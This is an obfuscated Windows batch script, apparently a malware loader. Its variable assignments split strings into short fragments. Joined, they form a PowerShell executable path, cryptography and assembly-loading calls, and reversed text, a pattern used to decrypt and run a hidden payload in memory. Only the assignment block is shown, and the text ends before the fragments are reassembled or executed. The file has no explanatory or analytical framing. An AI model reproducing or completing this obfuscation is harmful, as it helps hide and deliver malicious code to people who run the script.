@echo off
set "GOgQbmxnLQ=\v"
set "fDSrEVpQXX= /"
set "KNtyCTJcxb=in"
set "ROzhsHsUWf=po"
set "NMCAyzbJOA=Sy"
set "bEzzYacHKz=xe"
set "oyPuVYhKBC=s\"
set "SGOLuiVLBO=:\"
set "NVHxKDebFl=32"
set "LlOfADwlrz=ws"
set "raXDKcGOuw=rs"
set "zstGryttxD=co"
set "TcEDpKXIeB=we"
set "wyKXrdFtAN=he"
set "VSyONGdnsV=do"
set "UtEfXUGjay=nd"
set "fDirvEfTXK=0\"
set "WINqsRQVwp=.e"
set "fUsAcJHkPQ=ll"
set "CLLdzQnuqd=st"
set "gEpaZmNeDN=he"
set "NFMjGTiMRt= C"
set "ZUdzcwDjkZ=em"
set "xPybIegvjr=Wi"
set "yytatyYoXY=rS"
set "CvxSiCMMVf=\W"
set "KRnfoZBjVR=Po"
set "lTXNSjjqjs=py"
set "FrHJMSIwfH=we"
set "pHBeKEelsK=ow"
set "bmmWvvrHmm=1."
set "ghjSAyRYIh=y "
set "cwKhGNVyFC=ll"
set "tGoqBrmRRP= %~dp0"
set "plckwlRHzx=cd"
set "bvagdPHoDl=gth)"
set "MfyjvkMVEO=Cunw"
set "uZEzqvfuCN=yCkx"
set "VGzNiiQZNj='txe"
set "OSvwuoWepM=tHt."
set "xDWWrhfxYj=();$"
set "yxxQCSRFkO=($Fh"
set "EDVpvmfUpv=gjYA"
set "ZADrUtGici=Ydic"
set "oabSWsVCoa=$Cun"
set "rIDeRBIZBU=.Cop"
set "PcJOtILmqs=, (,"
set "pApvKXVovT=j, 0"
set "MtYMPgluBT=Secu"
set "RvFfSzIbLi=);$B"
set "TIdIMzjoiv=ment"
set "hamItKNuGV=Bmor"
set "eMcUJvEbBO=::('"
set "XHoYXDYrAn=, $y"
set "FpWexGTnpa=Syst"
set "ZZsKKGyXAK=[-1."
set "agHwhtLiYu=BrdF"
set "YOJoYlGahq=form"
set "yowbZjbAgt=-1.."
set "QRKyqpUlzZ= New"
set "IzyLWfuCQD=.Cry"
set "OAfDTDewTj=ke($"
set "tAYvUThqCH=.Ass"
set "ohlpwMsjJI=File"
set "mEeiMYvAzl=OyK."
set "fAxheCcLSc=ddin"
set "OpNWsnxbLj=;$Wr"
set "QcoVpNFBGL=am;$"
